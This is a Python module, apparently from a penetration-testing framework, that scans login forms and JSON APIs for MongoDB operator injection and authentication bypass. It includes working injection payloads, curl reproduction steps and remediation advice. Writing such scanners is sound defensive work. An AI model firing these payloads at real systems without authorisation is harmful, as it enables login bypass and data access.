"""NoSQL injection scanner — MongoDB operator injection and authentication bypass."""
from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_NOSQL = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"

# JSON operator injection payloads (MongoDB)
JSON_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$nin": []},
    {"$exists": True},
    {"$regex": ".*"},
    {"$where": "sleep(1000)"},
]

# Form-based payloads (URL-encoded)
FORM_PAYLOADS = [
    ("[$gt]", ""),
    ("[$ne]", "invalid"),
    ("[$nin][]", "notexist"),
    ("[$regex]", ".*"),
    ("[$exists]", "true"),
]

# NoSQL error indicators
NOSQL_ERRORS = [
    "mongodb", "MongoError", "CastError", "E11000",
    "bson", "BSON", "ObjectId", "$where",
    "mongo", "Mongoose", "MongoServerError",
]

AUTH_BYPASS_INDICATORS = [
    "welcome", "dashboard", "logged in", "success",
    "account", "profile", "home",
]


class NoSqlInject(BaseModule):
    """NoSQL injection scanner."""

    NAME        = "nosql_inject"
    DESCRIPTION = "Test for NoSQL injection via MongoDB operator injection"
    PHASE       = 4
    TAGS        = ["injection", "nosql", "mongodb", "cwe-943", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        forms   = self.config.extra.get("found_forms", [])
        crawled = self.config.extra.get("crawled_urls", [target])

        sem = asyncio.Semaphore(2)
        tasks: list = []

        # Test login forms first (most common NoSQL auth bypass)
        for form in forms[:10]:
            if any(kw in str(form).lower() for kw in ["login", "signin", "auth"]):
                tasks.append(self._test_form_nosql(form, target, sem))

        # Test JSON API endpoints
        for url in crawled[:20]:
            tasks.append(self._test_json_endpoint(url, target, sem))

        await asyncio.gather(*tasks, return_exceptions=True)
        return self._make_result(start)

    async def _test_form_nosql(
        self, form: dict, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            action = form["action"]
            if not action.startswith("http"):
                action = f"{target.rstrip('/')}/{action.lstrip('/')}"
            if not self.check_scope(action):
                return

            inputs = form.get("inputs", ["username", "password"])
            # Get baseline
            baseline = await self._post_form(
                action, {i: "invaliduser" for i in inputs}
            )
            if baseline is None:
                return

            # Try form-based NoSQL injection
            for param in inputs:
                for payload_key, payload_val in FORM_PAYLOADS:
                    await self.rate_limit()
                    data = {i: "invaliduser" for i in inputs}
                    # Replace param with injected key
                    del data[param]
                    data[f"{param}{payload_key}"] = payload_val
                    data[f"{param}"] = ""

                    result = await self._post_form(action, data)
                    if result is None:
                        continue
                    status, body = result

                    if any(ind in body for ind in NOSQL_ERRORS):
                        ev = Evidence(
                            request_raw=f"POST {action}\n{data}",
                            response_raw=body[:500],
                            extra={"payload": f"{param}{payload_key}={payload_val}"},
                        )
                        self.new_finding(
                            title=f"NoSQL Injection (Error-Based) — {param} @ {action}",
                            severity=Severity.HIGH,
                            description=(
                                f"NoSQL error triggered via operator injection in '{param}'. "
                                "Server returned MongoDB/NoSQL error details."
                            ),
                            reproduction_steps=[
                                f"POST {action}",
                                f"Body: {param}{payload_key}={payload_val}",
                            ],
                            remediation=(
                                "Validate that input matches expected type (string, not object). "
                                "Use strict JSON schema validation. "
                                "For MongoDB: use $eq operator, never pass objects from user input directly."
                            ),
                            references=["CWE-943", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL,
                            target=target,
                            url=action,
                        )
                        return

                    if (status == 200 and len(body) > len(str(baseline)) + 50 and
                        any(ind in body.lower() for ind in AUTH_BYPASS_INDICATORS)):
                        ev = Evidence(
                            request_raw=f"POST {action}\n{data}",
                            response_raw=body[:500],
                            extra={"payload": f"{param}{payload_key}"},
                        )
                        self.new_finding(
                            title=f"NoSQL Authentication Bypass — {param} @ {action}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"NoSQL authentication bypass via operator injection in '{param}'. "
                                "Attacker may authenticate without valid credentials."
                            ),
                            reproduction_steps=[
                                f"POST {action} with {param}[$ne]=invalid",
                            ],
                            remediation="Validate input types strictly; reject non-string values for auth fields.",
                            references=["CWE-943"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL,
                            target=target,
                            url=action,
                        )
                        return

    async def _test_json_endpoint(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            await self.rate_limit()
            if not self.check_scope(url):
                return

            for payload in JSON_PAYLOADS[:4]:
                try:
                    import aiohttp
                    json_body = json.dumps({"username": payload, "password": payload})
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.post(
                            url,
                            data=json_body,
                            headers={"Content-Type": "application/json"},
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            body = await resp.text(errors="ignore")

                    if any(ind in body for ind in NOSQL_ERRORS):
                        ev = Evidence(
                            request_raw=f"POST {url}\n{json_body}",
                            response_raw=body[:300],
                            extra={"payload": str(payload)},
                        )
                        self.new_finding(
                            title=f"NoSQL Injection (JSON) — {url}",
                            severity=Severity.HIGH,
                            description=f"NoSQL error via JSON operator injection at {url}.",
                            reproduction_steps=[
                                f"curl -X POST {url} -H 'Content-Type: application/json' -d '{json_body}'"
                            ],
                            remediation="Validate JSON body schema; reject unexpected object types.",
                            references=["CWE-943"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL,
                            target=target,
                            url=url,
                        )
                        return
                except Exception:
                    pass

    async def _post_form(self, url: str, data: dict):
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.post(
                    url, data=data, timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=True,
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return None


class TestNosqlInject:
    def test_json_payloads(self) -> None:
        assert len(JSON_PAYLOADS) >= 4
        # All should be dicts (MongoDB operators)
        assert all(isinstance(p, dict) for p in JSON_PAYLOADS)

    def test_error_indicators(self) -> None:
        assert "MongoError" in NOSQL_ERRORS
        assert "mongodb" in NOSQL_ERRORS
